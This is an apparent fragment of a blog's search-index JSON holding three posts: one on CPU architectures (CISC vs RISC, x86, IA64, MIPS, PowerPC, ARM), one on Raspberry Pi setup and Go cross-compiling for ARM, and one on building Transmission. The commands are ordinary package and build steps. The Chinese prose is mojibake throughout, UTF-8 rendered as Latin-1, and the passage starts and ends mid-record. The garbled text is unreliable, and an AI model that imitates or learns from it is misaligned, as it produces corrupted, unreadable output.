æ³•å·¥ä½œã€‚ç§»åŠ¨è®¾å¤‡å…¶å®å¾ˆå¤æ‚ï¼Œè¿™äº›CPUéœ€è¦æ‰§è¡Œæ•°ä»¥ç™¾ä¸‡è®¡çš„æŒ‡ç¤ºï¼Œæ‰èƒ½ä½¿å®ƒå‘æˆ‘ä»¬æœŸå¾…çš„æ–¹å‘è¿è¡Œï¼Œè€ŒCPUçš„é€Ÿåº¦å’ŒåŠŸç‡æ•ˆç‡æ˜¯è‡³å…³é‡è¦çš„ã€‚é€Ÿåº¦å½±å“ç”¨æˆ·ä½“éªŒï¼Œè€Œæ•ˆç‡å½±å“ç”µæ± å¯¿å‘½ã€‚æœ€å®Œç¾çš„ç§»åŠ¨è®¾å¤‡æ˜¯é«˜æ€§èƒ½å’Œä½åŠŸè€—ç›¸ç»“åˆã€‚ \n\n\n\n## CPUçš„æ¶æ„\n\nä»CPUå‘æ˜åˆ°ç°åœ¨ï¼Œæœ‰éå¸¸å¤šç§æ¶æ„ï¼Œä»æˆ‘ä»¬ç†Ÿæ‚‰çš„X86ï¼ŒARMï¼Œåˆ°ä¸å¤ªç†Ÿæ‚‰çš„MIPSï¼ŒIA64ï¼Œå®ƒä»¬ä¹‹é—´çš„å·®è·éƒ½éå¸¸å¤§ã€‚ä½†æ˜¯å¦‚æœä»æœ€åŸºæœ¬çš„é€»è¾‘è§’åº¦æ¥åˆ†ç±»çš„è¯ï¼Œå®ƒä»¬å¯ä»¥è¢«åˆ†ä¸ºä¸¤å¤§ç±»ï¼Œå³æ‰€è°“çš„â€œå¤æ‚æŒ‡ä»¤é›†â€ä¸â€œç²¾ç®€æŒ‡ä»¤é›†â€ç³»ç»Ÿï¼Œä¹Ÿå°±æ˜¯ç»å¸¸çœ‹åˆ°çš„â€œCISCâ€ä¸â€œRISCâ€ã€‚\n\n\n\n Intelå’ŒARMå¤„ç†å™¨çš„ç¬¬ä¸€ä¸ªåŒºåˆ«æ˜¯ï¼Œå‰è€…ä½¿ç”¨å¤æ‚æŒ‡ä»¤é›†ï¼ˆCISC)ï¼Œè€Œåè€…ä½¿ç”¨ç²¾ç®€æŒ‡ä»¤é›†ï¼ˆRISCï¼‰ã€‚å±äºè¿™ä¸¤ç§ç±»ä¸­çš„å„ç§æ¶æ„ä¹‹é—´æœ€å¤§çš„åŒºåˆ«ï¼Œåœ¨äºå®ƒä»¬çš„è®¾è®¡è€…è€ƒè™‘é—®é¢˜æ–¹å¼çš„ä¸åŒã€‚\n\n\n\næˆ‘ä»¬å¯ä»¥ç»§ç»­ä¸¾ä¸ªä¾‹å­ï¼Œæ¯”å¦‚è¯´æˆ‘ä»¬è¦å‘½ä»¤ä¸€ä¸ªäººåƒé¥­ï¼Œé‚£ä¹ˆæˆ‘ä»¬åº”è¯¥æ€ä¹ˆå‘½ä»¤å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥ç›´æ¥å¯¹ä»–ä¸‹è¾¾â€œåƒé¥­â€çš„å‘½ä»¤ï¼Œä¹Ÿå¯ä»¥å‘½ä»¤ä»–â€œå…ˆæ‹¿å‹ºå­ï¼Œç„¶åèˆ€èµ·ä¸€å‹ºé¥­ï¼Œç„¶åå¼ å˜´ï¼Œç„¶åé€åˆ°å˜´é‡Œï¼Œæœ€åå’½ä¸‹å»â€ã€‚ä»è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œå¯¹äºå‘½ä»¤åˆ«äººåšäº‹è¿™æ ·ä¸€ä»¶äº‹æƒ…ï¼Œä¸åŒçš„äººæœ‰ä¸åŒçš„ç†è§£ï¼Œæœ‰äººè®¤ä¸ºï¼Œå¦‚æœæˆ‘é¦–å…ˆç»™æ¥å—å‘½ä»¤çš„äººä»¥è¶³å¤Ÿçš„è®­ç»ƒï¼Œè®©ä»–æŒæ¡å„ç§å¤æ‚æŠ€èƒ½ï¼ˆå³åœ¨ç¡¬ä»¶ä¸­å®ç°å¯¹åº”çš„å¤æ‚åŠŸèƒ½ï¼‰ï¼Œé‚£ä¹ˆä»¥åå°±å¯ä»¥ç”¨éå¸¸ç®€å•çš„å‘½ä»¤è®©ä»–å»åšå¾ˆå¤æ‚çš„äº‹æƒ…â€”â€”æ¯”å¦‚åªè¦è¯´ä¸€å¥â€œåƒé¥­â€ï¼Œä»–å°±ä¼šåƒé¥­ã€‚ä½†æ˜¯ä¹Ÿæœ‰äººè®¤ä¸ºè¿™æ ·ä¼šè®©äº‹æƒ…å˜çš„å¤ªå¤æ‚ï¼Œæ¯•ç«Ÿæ¥å—å‘½ä»¤çš„äººè¦åšçš„äº‹æƒ…å¾ˆå¤æ‚ï¼Œå¦‚æœä½ è¿™æ—¶å€™æƒ³è®©ä»–åƒèœæ€ä¹ˆåŠï¼Ÿéš¾é“ç»§ç»­è®­ç»ƒä»–åƒèœçš„æ–¹æ³•ï¼Ÿæˆ‘ä»¬ä¸ºä»€ä¹ˆä¸å¯ä»¥æŠŠäº‹æƒ…åˆ†ä¸ºè®¸å¤šéå¸¸åŸºæœ¬çš„æ­¥éª¤ï¼Œè¿™æ ·åªéœ€è¦æ¥å—å‘½ä»¤çš„äººæ‡‚å¾—å¾ˆå°‘çš„åŸºæœ¬æŠ€èƒ½ï¼Œå°±å¯ä»¥å®ŒæˆåŒæ ·çš„å·¥ä½œï¼Œæ— éæ˜¯ä¸‹è¾¾å‘½ä»¤çš„äººç¨å¾®ç´¯ä¸€ç‚¹â€”â€”æ¯”å¦‚ç°åœ¨æˆ‘è¦ä»–åƒèœï¼Œåªéœ€è¦æŠŠåˆšåˆšåƒé¥­å‘½ä»¤é‡Œçš„â€œèˆ€èµ·ä¸€å‹ºé¥­â€æ”¹æˆâ€œèˆ€èµ·ä¸€å‹ºèœâ€ï¼Œé—®é¢˜å°±è§£å†³äº†ï¼Œå¤šä¹ˆç®€å•ã€‚è¿™å°±æ˜¯â€œå¤æ‚æŒ‡ä»¤é›†â€å’Œâ€œç²¾ç®€æŒ‡ä»¤é›†â€çš„é€»è¾‘åŒºåˆ«ã€‚\n\n<!-- more -->\n\n\n\n## CPUå¸¸è§æ¶æ„\n\n##### X86\n\n978å¹´6æœˆ8æ—¥ï¼ŒIntelå‘å¸ƒäº†å²è¯—çº§çš„CPUå¤„ç†å™¨8086ï¼Œç”±æ­¤X86æ¶æ„ä¼ å¥‡æ­£å¼æ‹‰å¼€å¸·å¹•ã€‚é¦–æ¬¡ä¸º8086å¼•å…¥X86ä½œä¸ºè®¡ç®—æœºè¯­è¨€çš„æŒ‡ä»¤é›†ï¼Œå®šä¹‰äº†ä¸€äº›åŸºæœ¬ä½¿ç”¨è§„åˆ™ï¼ŒX86æ¶æ„ä½¿ç”¨çš„æ˜¯CISCå¤æ‚æŒ‡ä»¤é›†ã€‚åŒæ—¶8086å¤„ç†å™¨çš„å¤§è·æˆåŠŸä¹Ÿç›´æ¥è®©Intelæˆä¸ºäº†CPUå·¨å¤´.\n\n##### IA64ï¼ˆIntel Architecture 64ï¼Œè‹±ç‰¹å°”æ¶æ„64ï¼‰\n\nå“‡ï¼ŒIA64å¬èµ·æ¥å¥½é™Œç”Ÿï¼Œæ˜¯çš„ï¼Œè™½ç„¶åŒå‡ºIntelä¹‹æ‰‹ã€‚ä½†è¿™å¯ä»¥è¯´æ˜¯å¤±è´¥å“ã€‚å½“å¹´X86è¿‡æ¸¡åˆ°64ä½æŒ‡ä»¤é›†æ—¶ï¼Œä¸€ä¸ªä¸å°å¿ƒè¢«AMDå¼¯é“è¶…è½¦ï¼Œæœ€ååªèƒ½è”åˆæƒ æ™®æ¨å‡ºäº†å±äºè‡ªå·±çš„IA64æŒ‡ä»¤é›†ï¼Œä½†è¿™ä¹Ÿä»…é™äºæœåŠ¡å™¨ä¸Šï¼Œä¹Ÿæ˜¯Itaniumå®‰è…¾å¤„ç†å™¨çš„æ¥å†ï¼ˆç°åœ¨å·²ç»å‡‰äº†ï¼‰\n\nè‡³äºIA64ç©¶ç«Ÿæ˜¯RISCè¿˜æ˜¯CISCæŒ‡ä»¤é›†çš„å»¶ç»­ï¼Œè¿™ä¸ªçœŸçš„å¾ˆéš¾è¯´æ¸…æ¥šï¼Œä½†å•çº¯ä»¥IA64åŸºäºHPçš„EPICï¼ˆExplicitly Parallel Instruction Computersï¼Œç²¾ç¡®å¹¶è¡ŒæŒ‡ä»¤è®¡ç®—æœºï¼‰æ¥çœ‹ï¼Œä¼¼ä¹æ›´åå‘äºRISCä½“ç³»ã€‚\n\n##### MIPSï¼ˆMicroprocessor without interlockedpipedstagesï¼Œæ— å†…éƒ¨äº’é”æµæ°´çº§çš„å¾®å¤„ç†å™¨ï¼‰\n\nåœ¨ä¸Šä¸–çºª80å¹´ä»£ç”±ç¾å›½æ–¯å¦ç¦å¤§å­¦Hennessyæ•™æˆçš„ç ”ç©¶å°ç»„ç ”å‘ï¼Œå®ƒé‡‡ç”¨ç²¾ç®€æŒ‡ä»¤ç³»ç»Ÿè®¡ç®—ç»“æ„(RISC)æ¥è®¾è®¡èŠ¯ç‰‡ã€‚å’ŒIntelé‡‡ç”¨çš„å¤æ‚æŒ‡ä»¤ç³»ç»Ÿè®¡ç®—ç»“æ„(CISC)ç›¸æ¯”ï¼ŒRISCå…·æœ‰è®¾è®¡æ›´ç®€å•ã€è®¾è®¡å‘¨æœŸæ›´çŸ­ç­‰ä¼˜ç‚¹ï¼Œå¹¶å¯ä»¥åº”ç”¨æ›´å¤šå…ˆè¿›çš„æŠ€æœ¯ï¼Œå¼€å‘æ›´å¿«çš„ä¸‹ä¸€ä»£å¤„ç†å™¨ã€‚\n\nMIPSæ˜¯å‡ºç°æœ€æ—©çš„å•†ä¸šRISCæ¶æ„èŠ¯ç‰‡ä¹‹ä¸€ï¼Œæ–°çš„æ¶æ„é›†æˆäº†æ‰€æœ‰åŸæ¥MIPSæŒ‡ä»¤é›†ï¼Œå¹¶å¢åŠ äº†è®¸å¤šæ›´å¼ºå¤§çš„åŠŸèƒ½ã€‚MIPSè‡ªå·±åªè¿›è¡ŒCPUçš„è®¾è®¡ï¼Œä¹‹åæŠŠè®¾è®¡æ–¹æ¡ˆæˆæƒç»™å®¢æˆ·ï¼Œä½¿å¾—å®¢æˆ·èƒ½å¤Ÿåˆ¶é€ å‡ºé«˜æ€§èƒ½çš„CPUã€‚\n\nè®©MIPSå‡ºåçš„ï¼Œå¯èƒ½æ˜¯åœ¨2007å¹´ï¼Œä¸­ç§‘é™¢è®¡ç®—æœºç ”ç©¶æ‰€çš„é¾™èŠ¯å¤„ç†å™¨è·å¾—äº†MIPSçš„å…¨éƒ¨ä¸“åˆ©ã€æŒ‡ä»¤é›†æˆæƒï¼Œä¸­å›½å¼€å§‹èµ°ä¸Šäº†ä¸€MIPSä¸ºåŸºç¡€çš„CPUç ”å‘é“è·¯ã€‚\n\n##### PowerPC\n\nPowerPCæ˜¯æœ‰è“è‰²å·¨äººIBMè”åˆè‹¹æœ(æ—©æœŸmacç”¨çš„å°±æ˜¯è¿™ä¸ª)ã€æ‘©æ‰˜ç½—æ‹‰å…¬å¸ç ”å‘çš„ä¸€ç§åŸºäºRISCç²¾ç®€æŒ‡ä»¤é›†çš„CPUï¼ŒPowerPCæ¶æ„æœ€å¤§ä¼˜ç‚¹æ˜¯çµæ´»æ€§éå¸¸å¥½ï¼Œæ ¸å¿ƒæ•°ç›®çµæ´»å¯å˜ï¼Œå› æ­¤åœ¨åµŒå…¥å¼è®¾å¤‡ä¸Šå…·æœ‰å¾ˆé«˜æ•ˆç›Šï¼Œå¯ä»¥é’ˆå¯¹æœåŠ¡å™¨å¸‚åœºåšè¶…å¤šæ ¸ï¼Œé’ˆå¯¹æŒæœºåšåŒæ ¸ï¼Œå› æ­¤å®ƒå…·æœ‰ä¼˜å¼‚çš„æ€§èƒ½ã€è¾ƒä½çš„èƒ½é‡æŸè€—ä»¥åŠè¾ƒä½çš„æ•£çƒ­é‡ã€‚\n\n##### ARMï¼ˆAdvanced RISC Machineï¼Œè¿›é˜¶ç²¾ç®€æŒ‡ä»¤é›†æœºå™¨ï¼‰\n\nARMå¯ä»¥è¯´æ˜¯ä¸€ä¸ªå¼‚å†›çªèµ·çš„CPUæ¶æ„ï¼Œé‡‡ç”¨äº†RISCç²¾ç®€æŒ‡ä»¤é›†ï¼Œè€Œä¸”ARMå‘å±•åˆ°ä»Šå¤©ï¼Œæ¶æ„ä¸Šéå¸¸çµæ´»ï¼Œå¯ä»¥æ ¹æ®é¢å‘åº”ç”¨åœºæ™¯ä¸åŒä½¿ç”¨ä¸åŒè®¾è®¡çš„å†…æ ¸ï¼Œå› æ­¤å¯ä»¥å¹¿æ³›ç”¨äºåµŒå…¥å¼ç³»ç»Ÿä¸­ï¼ŒåŒæ—¶å®ƒé«˜åº¦èŠ‚èƒ½çš„ç‰¹æ€§ï¼Œç›®å‰å„ç§ç§»åŠ¨è®¾å¤‡ä¸­å…¨éƒ½æ˜¯å®ƒçš„èº«å½±ã€‚æ®ç»Ÿè®¡ï¼Œä½¿ç”¨ARMæ¶æ„çš„èŠ¯ç‰‡å¹´å‡ºè´§é‡é«˜è¾¾200äº¿ç‰‡ï¼Œéšç€ç‰©è”ç½‘æ—¶ä»£é™ä¸´ï¼Œå¯¹äºä½åŠŸè€—æ€§ARMèŠ¯ç‰‡éœ€æ±‚é‡ä¼šå‘ç”Ÿçˆ†ç‚¸æ€§å¢é•¿ã€‚\n\n\n\n## CPUæ¶æ„é—®é¢˜æ€»ç»“\n\n##### CISCã€RISCä¹‹äº‰\n\nä»ä¸Šé¢å¾—çŸ¥ï¼Œå†å²çš„é•¿æ²³é‡Œé¢ï¼Œæœ‰è¿‡è®¸è®¸å¤šå¤šçš„CPUæ¶æ„ï¼Œå®ƒä»¬ä¹‹é—´çš„å·®å¼‚æ€§éå¸¸å¤§ï¼Œç»è¿‡æ—¶é—´ã€ç”¨æˆ·çš„æ£€éªŒï¼Œæˆ‘ä»¬å¹³å¸¸æ‰€æ¥è§¦åˆ°CPUæ¶æ„ä¹Ÿå°±å‰©X86å’ŒARMä¸¤è€…ï¼ŒæŒ‰ç…§æœ€æ ¸å¿ƒçš„ä¸åŒå¯ä»¥è¢«åˆ†ä¸ºä¸¤å¤§ç±»ï¼Œå³â€œå¤æ‚æŒ‡ä»¤é›†â€ä¸â€œç²¾ç®€æŒ‡ä»¤é›†â€ç³»ç»Ÿï¼Œä¹Ÿå°±æ˜¯ç»å¸¸çœ‹åˆ°çš„â€œCISCâ€ä¸â€œRISCâ€ã€‚\n\n\n\nè¦äº†è§£X86å’ŒARM CPUæ¶æ„ï¼Œå°±å¾—å…ˆäº†è§£CISCå¤æ‚æŒ‡ä»¤é›†å’ŒRISCç²¾ç®€æŒ‡ä»¤é›† ï¼Œå› ä¸ºå®ƒä»¬ç¬¬ä¸€ä¸ªåŒºåˆ«å°±æ˜¯X86ä½¿ç”¨äº†å¤æ‚æŒ‡ä»¤é›†ï¼ˆCISCï¼‰ï¼Œè€Œåè€…ä½¿ç”¨ç²¾ç®€æŒ‡ä»¤é›†ï¼ˆRISCï¼‰ã€‚é€ æˆä»–ä»¬ä½¿ç”¨ä¸åŒè¯¥æŒ‡ä»¤é›†çš„åŸå› åœ¨äºï¼Œé¢å‘çš„è®¾å¤‡ã€å¯¹è±¡ã€æ€§èƒ½è¦æ±‚æ˜¯ä¸ä¸€æ ·ã€‚\n\næ‰‹æœºSoCæ™®ééƒ½æ˜¯é‡‡ç”¨ARMæä¾›çš„æ ¸å¿ƒä½œä¸ºåŸºç¡€ï¼Œä¾æ®è‡ªèº«éœ€æ±‚æ”¹å˜SoCçš„æ ¸å¿ƒæ¶æ„ï¼Œè€ŒARMæ­£æ­£æ˜¯RISCç²¾ç®€æŒ‡ä»¤é›†çš„ä»£è¡¨äººç‰©ã€‚CPUå·¨å¤´Intelã€AMDæ‰€é‡‡ç”¨çš„X86æ¶æ„å·²ç»æ²¿ç”¨äº†æ•°åå¹´ï¼Œæ˜¯CISCå¤æ‚æŒ‡ä»¤é›†çš„å…¸å‹ä»£è¡¨ã€‚\n\n\n\n##### ä¸ºä»€ä¹ˆx86ä¸å«x32\n\nx86ï¼Œx64ï¼Œçœ‹ä¼¼å†™æ³•ç±»ä¼¼ï¼Œä½†å®é™…ä¸Šä»£è¡¨äº†å®Œå…¨ä¸åŒçš„å«ä¹‰ã€‚ç®€å•æ¥è¯´ï¼Œx86æŒ‡çš„æ˜¯cpuçš„æ¶æ„ï¼Œx64æ˜¯cpuä½æ•°ã€‚ç¬¼ç»Ÿçš„è¯´ï¼Œå‰è€…ä»£è¡¨cpuçš„é€»è¾‘ç»“æ„ï¼Œåè€…æ˜¯cpuè¿ç®—èƒ½åŠ›ã€‚é™¤äº†x86æ¶æ„çš„cpuå¤–ï¼Œè¿˜æœ‰å¾ˆå¤šä¸åŒæ¶æ„çš„cpuï¼Œå…¶ä¸­æœ€æœ‰åçš„å°±æ˜¯IAæ¶æ„ï¼Œå³intelå®‰è…¾æ¶æ„ã€‚ä¸¤è€…ä¹‹é—´çš„ç³»ç»Ÿã€è½¯ä»¶ä¸èƒ½é€šç”¨ã€‚\n\nè€Œx64çš„å…¨ç§°å«x86-64ï¼Œä¹Ÿå°±æ˜¯è¯´x64æ˜¯x86æ¶æ„çš„64ä½cpuã€‚\n\n\n\nx86æ¶æ„ä¸­ï¼Œæœ€æ—©çš„cpuæ˜¯16ä½çš„ï¼Œå³8086ï¼Œå…¶å‰èº«è¿˜æœ‰8ä½çš„8008å’Œ4ä½çš„4004ï¼Œä½†åä¸¤è€…æ˜¯å¦å¤–çš„æ¶æ„ã€‚åå‡ºçš„80386å·²ç»å‡çº§åˆ°32ä½ã€‚\n\nè¿™æ ·å°±å¯ä»¥è§£é‡Šå¼€å§‹çš„é—®é¢˜äº†ã€‚x86æ˜¯ä¸€ç§æ¶æ„çš„å‘½åï¼Œä»£è¡¨æ‰€æœ‰çš„è¯¥æ¶æ„ä¸‹çš„cpuï¼ŒåŒ…æ‹¬16ä½ï¼Œ32ä½ï¼Œ64ä½ï¼Œå°†æ¥ä¹Ÿè®¸ä¼šæœ‰128ä½ã€‚ä¹‹æ‰€ä»¥ç”¨x86ä»£è¡¨32ä½ç³»ç»Ÿï¼Œæ˜¯ä¸€ç§é€šä¿—ç”¨æ³•ç½¢äº†ï¼Œæ˜¯ä¸ä¸¥è°¨ç”šè‡³æœ‰è¯¯çš„ã€‚ç”±äº16ä½cpuæ—©å·²æ·˜æ±°ä¸ç”¨äº†ï¼Œè€Œåœ¨64ä½å‡ºæ¥å‰ï¼Œ32ä½cpuå æ®äº†å¾ˆé•¿ä¸€æ®µæ—¶é—´ï¼Œæ‰€ä»¥ä¹ æƒ¯æ€§çš„ç”¨x86ä»£è¡¨32ä½cpuã€‚è€Œx64æ˜¯ä¸€ä¸ªç®€å†™ï¼Œå‘Šè¯‰å¤§å®¶çš„æ˜¯ï¼šæˆ‘æ˜¯x86æ¶æ„ä¸­çš„64ä½cpuã€‚\n\n\n\nå¦‚æœä¸¥è°¨çš„æŒ‰å‘½åè§„åˆ™æ¥çœ‹ï¼Œç°åœ¨çš„x86åº”è¯¥å«x86-32ï¼Œç®€ç§°x32ã€‚ä»¥å‰16ä½çš„8086åˆ™åº”è¯¥å«x86-16ï¼Œç®€ç§°x16ã€‚å› æ­¤ï¼Œx86ä¸å«x32ï¼Œåªæ˜¯ä¸€ç§ä¹ ç§°ï¼Œä¸€ç§è¯¯ç§°ã€‚\n\nIAæ¶æ„ä¸‹çš„cpuå‘½ååˆ™æ¯”è¾ƒä¸¥è°¨ï¼Œ32ä½å°±å«IA32ï¼Œ64å°±å«IA64ã€‚\n\n\n\n##### macä¸Šå¯ä»¥ç©iphoneçš„appå—\n\nXcodeè‡ªå¸¦çš„iOSæ¨¡æ‹Ÿå™¨å¹¶ä¸æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„æ¨¡æ‹Ÿå™¨,ä»–æ²¡æœ‰è¿è¡ŒarmæŒ‡ä»¤çš„èƒ½åŠ›,ä¹‹æ‰€ä»¥ä½ å¯ä»¥ç”¨å®ƒè°ƒè¯•ä½ å¼€å‘çš„app,æ˜¯å› ä¸ºè°ƒè¯•ç›®æ ‡é€‰ä¸ºæ¨¡æ‹Ÿå™¨çš„æ—¶å€™,Xcodeç”Ÿæˆçš„ä»£ç æ˜¯x86/x86_64æ¶æ„ç”¨çš„,å…·ä½“æ˜¯x86è¿˜æ˜¯x86_64å–å†³äºä½ é€‰çš„æœºå‹,å¦‚æœä½ é€‰iPhone5Sä¹‹å‰çš„æœºå‹çš„æ¨¡æ‹Ÿå™¨,é‚£å°±æ˜¯x86.\n\n\n\næ¢ä¸ªè¯´æ³•,å°±æ˜¯è¿™ä¸ªæ¨¡æ‹Ÿå™¨å¹¶æ²¡æœ‰æ¨¡æ‹Ÿarmå¤„ç†å™¨ç­‰ç¡¬ä»¶,åªæ˜¯åœ¨x86/x86_64æ¶æ„ä¸Šæä¾›äº†å’ŒiOSä¸€æ ·çš„æ¥å£çš„SDK,å…¶æ¥å£çš„è¡Œä¸ºä¹Ÿå’ŒiOSä¸Šå‡ ä¹ä¸€æ ·.ä¹‹æ‰€ä»¥è¯´å‡ ä¹ä¸€æ ·,æ˜¯å› ä¸ºçœŸçš„æœ‰ä¸ä¸€æ ·çš„åœ°æ–¹.\n\n\n\nå¥½äº†,åˆ°è¿™é‡Œä½ çŸ¥é“äº†,è¿™ä¸ªæ¨¡æ‹Ÿå™¨å…¶å®å°±æ˜¯ä¸€ä¸ªapp,æ¨¡æ‹Ÿä¸‹iOSçš„è¡Œä¸º,é‚£äº›è·‘åœ¨é‡Œé¢çš„app,å…¶å®ä¹Ÿéƒ½æ˜¯x86/x86_64çš„, è€Œapp storeä¸Šä¸Šæ¶çš„é‚£äº›app, éƒ½ä¸ä¼šåŒ…å«x86/x86_64æ¶æ„,åªæ”¯æŒarmæ¶æ„,æ‰€ä»¥æ— è®ºå¦‚ä½•ä½ ä¹Ÿæ²¡åŠæ³•åœ¨ç”µè„‘ä¸Šè¿è¡Œä»–ä»¬.\n\nè‡³äºä¸ºä»€ä¹ˆandroidå¯ä»¥,å› ä¸ºandroidæ˜¯å¼€æºçš„,ä½¿ç”¨çš„å¤„ç†å™¨æ¶æ„ä¹Ÿæ˜¯èµ„æ–™ä¸°å¯Œ,æ‰€ä»¥å¯ä»¥å¼€å‘å‡ºæ¥çœŸæ­£çš„å¯ä»¥è™šæ‹Ÿarmå¤„ç†å™¨ä»¥åŠå…¶å®ƒç¡¬ä»¶çš„æ¨¡æ‹Ÿå™¨,è¿™æ ·å°±å¯ä»¥åœ¨ç”µè„‘ä¸Šè¿è¡Œandroid appäº†.è€ŒiPhone, iTouch, iPadä½¿ç”¨çš„å¤„ç†å™¨ä¼°è®¡ç›®å‰è¿˜æ²¡æœ‰è°èƒ½çœŸæ­£æ¨¡æ‹Ÿå‡ºæ¥, å°±ç®—æœ‰è¿™ç§èƒ½äºº, ä»–ä¹Ÿæœªå¿…æœ‰åšæ¨¡æ‹Ÿå™¨çš„æƒ³æ³•,å°±ç®—æœ‰è¿™ä¸ªæƒ³æ³•,é‚£ä¹Ÿæœªå¿…æœ‰é‚£ä¸ªèƒ†é‡.\n\n\n\næœ€åè¯´ä¸ªå¸¸è¯†:\n\nåœ¨å¼€å‘iOS appæ¥å…¥ç¬¬ä¸‰æ–¹sdkçš„æ—¶å€™, å¶å°”ä¼šé‡åˆ°æ¨¡æ‹Ÿå™¨æ— æ³•æ­£ç¡®link, ä½†æ˜¯çœŸæœºå¯ä»¥çš„æƒ…å†µ.è¿™å…¶å®å°±æ˜¯å› ä¸ºsdkæä¾›å•†æä¾›çš„sdk,æ ¹æœ¬å°±æ²¡æ”¯æŒx86/x86_64,é„™è§†\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["cpu"],"categories":["ç³»ç»Ÿ"]},{"title":"åœ¨æ ‘è“æ´¾armä¸Šè¿è¡Œgolangå’Œcç¨‹åº","url":"%2Fp%2F21dd607c.html","content":"\n\n## æ ‘è“æ´¾åŸºç¡€è®¾ç½®\n\n##### æ ‘è“æ´¾ä¿®æ”¹é”®ç›˜å¸ƒå±€\n\n```\nsudo dpkg-reconfigure keyboard-configuration\n```\n\né€‰é€šç”¨çš„101é”®PCé”®ç›˜\n\nåœ¨é”®ç›˜layouté€‰æ‹©ä¸­ï¼Œé€‰Other\n\nç„¶ååœ¨é€‰é¡¹ä¸­ï¼Œé€‰English(US)\n\nå†é€‰English(US, alternative international)\n\nä¸€ç›´ä¸‹ä¸€æ­¥,æœ€åé‡å¯\n\n```\nsudo reboot\n```\n\n\n\n##### æ ‘è“æ´¾ä¿®æ”¹å¯åŠ¨è¿›å…¥ç»ˆç«¯ç•Œé¢\n\n```\n\nsudo raspi-config\n\nboot option ->console\n\n```\n<!-- more -->\n\n\n##### æ ‘è“æ´¾å¼€å¯ssh\n\n```\n\nsudo raspi-config\n\nSelect Interfacing Options\n\nNavigate to and select SSH\n\nChoose Yes\n\nSelect Ok\n\nChoose Finish\n\n\nsudo systemctl enable ssh\n\nsudo systemctl start ssh\n```\n\n\n\n## ç¼–è¯‘golangä¸ºarmå¯æ‰§è¡Œç¨‹åº\n\n\n\n```\nGOOS=linux GOARCH=arm GOARM=6 go build -v\n```\n\n\n\nGOARM=5: use software floating point; when CPU doesn't have VFP co-processor\n\nGOARM=6: use VFPv1 only; default if cross compiling; usually ARM11 or better cores (VFPv2 or better is also supported)\n\nGOARM=7: use VFPv3; usually Cortex-A cores\n\n\n\n## ç¼–è¯‘armå¯æ‰§è¡Œç¨‹åº\n\nç¼ºå°‘çš„ç¨‹åºç›´æ¥ä½¿ç”¨`åŒ…ç®¡ç†`ä¸‹è½½å³å¯\n\n##### è§£å†³ä¸‹è½½è½¯ä»¶åŒ…è¿æ¥ä¸ä¸Šçš„é—®é¢˜ connect to mirrors.opencas.cn....\n\n   ```\nsudo vim /etc/apt/sources.list \n   \næ›¿æ¢æºä¸º\n   \ndeb http://mirrors.shu.edu.cn/raspbian/raspbian/ stretch main contrib non-free rpi\n   \nsudo apt-get update&& sudo apt-get -y dist-upgrade&&sudo apt-get update \n   ```\n","tags":["æ ‘è“æ´¾"],"categories":["ç³»ç»Ÿ"]},{"title":"transmissionç¼–è¯‘å®‰è£…å’Œgolang_rpcçš„è°ƒç”¨","url":"%2Fp%2Fbf531b37.html","content":"\n### 1. macç¼–è¯‘transmission\n\n+ ä¸‹è½½é¡¹ç›®\n\n```bash\ngit clone https://github.com/transmission/transmission Transmission\ncd Transmission\ngit submodule update --init\nXcode project file (Transmission.xcodeproj) for building in Xcode. \n```\n\n\n\n+ åœ¨ xcodeä¸­ç¼–è¯‘\n\n  ä¸‹å›¾ç¬¬ä¸€ä¸ªæ˜¯ç¼–è¯‘ mac çš„åº”ç”¨ç¨‹åº,  ç¬¬äºŒä¸ªæ˜¯å¯ä»¥ç¼–è¯‘ transmission-daemon ç¨‹åº\n\n![1](transmission/1.png)\n\n<!-- more -->\n\n\n\n### 2. ubuntu 16.04ç¼–è¯‘transmission\n\n```bash\n$ sudo apt-get install cmake make build-essential automake autoconf libtool pkg-config intltool libcurl4-openssl-dev libglib2.0-dev libevent-dev libminiupnpc-dev libgtk-3-dev libappindicator3-dev gettext libssl-dev\n\n$ git clone https://github.com/transmission/transmission Transmission\n$ cd Transmission\n$ git submodule update --init\n$ mkdir build\n$ cd build\n$ cmake ..\n$ make\n$ sudo make install (make install DESTDIR=a)\n```\n\nå®‰è£…å®Œæˆåå‡ºç°ä»¥ä¸‹å‘½ä»¤:\n\n![2](transmission/2.png)\n\n\n\nç¼–è¯‘æ—¶é‡åˆ°çš„é—®é¢˜:\n\n1. CMAKE_MAKE_PROGRAM is not set\n\n```\nsudo apt-get install gettext\nsudo apt-get install make \nsudo apt-get install libssl-dev\n```\n\n2. missing: CURL_LIBRARY CURL_INCLUDE_DIR\n\n```\nsudo apt-get install libcurl4-openssl-dev//ubuntu\nyum install curl-devel//centos\n```\n\n3. autogen.sh: not found\n\n```\nsudo apt-get install autoconf\nsudo apt-get install automake\nsudo apt-get install libtool\n```\n\n4. transmission libevent å˜æˆäº†event\n\n   æŠŠæ‰€æœ‰çš„ä¾èµ–å…¨éƒ¨è£…ä¸€é, å®‰è£…ååˆ é™¤build. é‡æ–°cmakeä¸€ä¸‹\n\n5. undefined reference to `g_log_structured_standard`\n\n   ```bash\n   apt-get remove --purge libglib*\n   apt-get install libglib-2.x-y  # where x and y are whatever the package version says.\n   ```\n\n   \n\n\n\n### 3. transmission ä»‹ç»\n\n- transmission-cliï¼š ç‹¬ç«‹çš„å‘½ä»¤è¡Œå®¢æˆ·ç«¯ã€‚\n- transmission-createï¼š ç”¨æ¥å»ºç«‹.torrentç§å­æ–‡ä»¶çš„å‘½ä»¤è¡Œå·¥å…·ã€‚\n- transmission-daemonï¼š åå°å®ˆæŠ¤ç¨‹åºã€‚\n- transmission-editï¼š ç”¨æ¥ä¿®æ”¹.torrentç§å­æ–‡ä»¶çš„announce URLã€‚\n- transmission-remoteï¼š æ§åˆ¶daemonçš„ç¨‹åºã€‚\n- transmission-showï¼šæŸ¥çœ‹.torrentæ–‡ä»¶çš„ä¿¡æ¯ã€‚\n\n\n\n1. é…ç½®æ–‡ä»¶ç›®å½•é‡Œé¢åŒ…å«å¦‚ä¸‹ä¸€äº›æ–‡ä»¶ï¼š\n\n- settings.jsonï¼š ä¸»è¦çš„é…ç½®æ–‡ä»¶ï¼Œè®¾ç½®daemonçš„å„é¡¹å‚æ•°ï¼ŒåŒ…æ‹¬RPCçš„ç”¨æˆ·åå¯†ç 